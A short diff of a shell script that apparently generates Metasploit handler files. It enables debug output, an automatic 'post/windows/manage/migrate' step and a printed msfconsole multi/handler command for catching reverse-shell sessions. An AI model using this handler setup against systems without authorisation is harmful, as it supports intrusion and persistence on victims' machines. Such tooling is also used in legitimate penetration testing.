@@ -75,7 +75,7 @@ HELP=false             # Display the help screen?
 DARWIN=false           # In case of OSX users
 
 ##### (Optional) Enable debug mode?
-#set -x
+set -x
 
 
 #-Function----------------------------------------------------#
@@ -175,13 +175,13 @@ set ${HOST} ${IP}
 set LPORT ${PORT}
 set ExitOnSession false
 set EnableStageEncoding true
-#set AutoRunScript 'post/windows/manage/migrate'
+set AutoRunScript 'post/windows/manage/migrate'
 run -j
 EOF
 
   echo -e " ${YELLOW}[i]${RESET} MSF handler file: '${FILEHANDLE}'"
   echo -e " ${YELLOW}[i]${RESET} Run: msfconsole -q -r '${FILEHANDLE}'"
-  #echo -e " ${YELLOW}[i]${RESET} MSF command: msfconsole -x \"use exploit/multi/handler; \\\\\n  set PAYLOAD ${PAYLOAD}; \\\\\n  set ${HOST} ${IP}; \\\\\n  set LPORT ${PORT}; \\\\\n  set ExitOnSession false; \\\\\n  run -j\""
+  echo -e " ${YELLOW}[i]${RESET} MSF command: msfconsole -x \"use exploit/multi/handler; \\\\\n  set PAYLOAD ${PAYLOAD}; \\\\\n  set ${HOST} ${IP}; \\\\\n  set LPORT ${PORT}; \\\\\n  set ExitOnSession false; \\\\\n  run -j\""
   SUCCESS=true
   return
 }
